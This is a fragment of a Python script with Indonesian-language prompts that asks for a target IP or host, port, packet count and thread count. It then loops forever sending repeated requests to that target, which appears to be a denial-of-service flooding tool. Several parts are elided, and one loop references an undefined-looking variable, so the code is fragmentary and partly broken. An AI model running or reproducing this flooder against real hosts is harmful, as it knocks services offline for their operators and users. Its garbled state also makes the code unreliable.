...
print("\033[90m━━━[+] Masukan Ip/Host")
ip = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[35m━━━[+] Masukan Port")
port = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
time.sleep(1)
print("\033[35m━━━[+] Masukan Jumlah Packet")	
times = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[90m━━━[+] Masukan Jumlah Threads")	
    ...
    while True:
        try:
            ...
            for x in range(time):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(f"[!] Send packet to => {ip} Port => {port}")
        except :
            print(f"[!] Send packet to => {ip} Port => {port}")
            s.close()
